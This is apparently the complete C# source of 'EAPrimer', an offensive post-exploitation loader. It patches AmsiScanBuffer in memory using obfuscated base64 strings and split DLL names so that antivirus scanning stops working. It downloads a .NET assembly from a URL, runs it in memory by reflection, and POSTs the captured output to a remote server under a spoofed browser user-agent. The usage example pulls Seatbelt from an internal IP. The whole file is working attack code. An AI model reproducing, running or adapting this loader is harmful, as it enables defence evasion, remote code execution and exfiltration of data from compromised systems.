using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Collections.Specialized;

using System.Runtime.InteropServices;
namespace EAPrimer
{
    public class Program
    {
        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ke" + "rne" + "l32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("ke" + "rne" + "l32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
        {
            Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
        }
        private static void ApplyMemoryPatch()
        {
            // Help and resources:
            // @chwagner
            //https://github.com/rasta-mouse/AmsiScanBufferBypass/tree/master/ASBBypass
            //https://github.com/Flangvik/NetLoader
            // Thank you <3
            try
            {
                var abc = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
                IntPtr addr = GetProcAddress(abc, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
                uint magicRastaValue = 0x40;
                uint someNumber = 0;

                if (System.Environment.Is64BitOperatingSystem)
                {
                    var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                    VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
                    CopyData(bigBoyBytes, addr);
                }
                else
                {
                    var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

                    VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
                    CopyData(smallBoyBytes, addr);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] {0}", ex.Message);
            }
        }

        static void ExecuteAssembly(string b64Assembly, string[] arguments)
        {
            var bytes = Convert.FromBase64String(b64Assembly);
            var target = Assembly.Load(bytes).EntryPoint;
            target.Invoke(null, new object[] { arguments });
        }

        static void PostData(string URL, string postData)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            wc.UploadString(URL, "POST", postData);
        }

        static byte[] GetAssembly(string URL)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            return wc.DownloadData(URL);
        }

        static Dictionary<string, string> ParseArgs(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var x = argument.IndexOf('=');
                if (x > 0)
                {
                    arguments[argument.Substring(0, x)] = argument.Substring(x + 1);
                }
                else
                {
                    arguments[argument] = string.Empty;
                }
            }
            return arguments;
        }

        public static void Main(string[] args)
        {
            var outputData = "";
            var b64Assembly = "";
            byte[] assemblyBytes = null;
            string[] assemblyArgs = { };
            var origOut = Console.Out;
            Dictionary<string, string> arguments = ParseArgs(args);

            using (var writer = new StringWriter())
            {
                try
                {
                    // Setup writer
                    if (arguments.ContainsKey("-post"))
                    {
                        Console.SetOut(writer);
                    }
                    else
                    {
                        Console.SetOut(origOut);
                    }

                    //Verify Args
                    if (arguments.Count < 1 || arguments.ContainsKey("-help") || !arguments.ContainsKey("-path"))
                    {
                        Console.WriteLine("\n\t\t<----<< EAPrimer v0.1.1 >>---->");
                        Console.WriteLine("Arguments");
                        Console.WriteLine("-path                URL or local path to assembly");
                        Console.WriteLine("-post                Local path for output or URL to POST base64 encoded results. Default: console output.");
                        Console.WriteLine("-args                Add arguments for target assembly.");
                        Console.WriteLine("-skip-amsi           Skip AMSI in memory patch.\n\n");
                        Console.WriteLine("EAPrimer.exe -path=https://192.168.1.2/Seatbelt.exe -post=https://192.168.1.2 -args=\"-group=all\"\n\n");
                    }
                    else
                    {
                        if (arguments.ContainsKey("-skip-amsi"))
                        {
                            Console.WriteLine("[*] Applying In-Memory Patch");
                            ApplyMemoryPatch();

                        }

                        // Setup Assembly Args
                        if (arguments.ContainsKey("-args"))
                        {
                            assemblyArgs = new String[] { arguments["-args"] };
                            Console.WriteLine("[*] Assembly Args: \"{0}\"", assemblyArgs);
                        }

                        // Get Assembly
                        if (arguments["-path"].StartsWith("http://") || arguments["-path"].StartsWith("https://"))
                        {
                            Console.WriteLine("[*] Loading Asembly from: {0}", arguments["-path"]);
                            assemblyBytes = assemblyBytes = GetAssembly(arguments["-path"]);
                        }
                        else
                        {
                            Console.WriteLine("[*] Loading Asembly from: {0}", arguments["-path"]);
                            assemblyBytes = File.ReadAllBytes(arguments["-path"]);
                        }

                        // Execute assembly and capture output from "void" Main
                        b64Assembly = Convert.ToBase64String(assemblyBytes);
                        ExecuteAssembly(b64Assembly, assemblyArgs);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] EAPrimer Error: " + ex);
                }

                // Collect Output
                outputData = writer.GetStringBuilder().ToString();
                writer.Flush();
                Console.WriteLine(outputData);

                // Post Results
                Console.SetOut(origOut);
                if (arguments.ContainsKey("-post"))
                {
                    if (arguments["-post"].StartsWith("http://") || arguments["-post"].StartsWith("https://"))
                    {
                        PostData(arguments["-post"], outputData);
                    }
                    else
                    {
                        using (StreamWriter w = new StreamWriter(arguments["-post"]))
                        {
                            Console.SetOut(w);
                            Console.WriteLine(outputData);
                        }
                    }
                }
                else
                {
                    Console.WriteLine(outputData);
                }
            }
        }

    }
}

